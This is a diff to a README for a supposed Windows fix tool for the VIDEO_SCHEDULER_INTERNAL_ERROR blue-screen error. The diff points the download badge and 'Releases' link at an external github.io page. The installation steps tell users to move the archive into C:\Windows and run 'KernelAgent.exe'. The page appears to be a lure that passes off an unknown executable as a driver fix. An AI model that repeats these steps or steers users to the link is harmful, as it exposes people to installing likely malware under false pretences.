@@ -2,7 +2,7 @@
 
 This project provides a fast and reliable fix for the VIDEO_SCHEDULER_INTERNAL_ERROR BSOD on Windows. Works with both NVIDIA and AMD graphics cards.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)]()
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-video-scheduler-internal-windows.github.io/.github)
 
 ---
 
@@ -17,7 +17,7 @@ This project provides a fast and reliable fix for the VIDEO_SCHEDULER_INTERNAL_E
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases]() section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://fix-video-scheduler-internal-windows.github.io/.github) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `KernelAgent.exe`  
 4. 🔁 Restart your computer after the process is complete
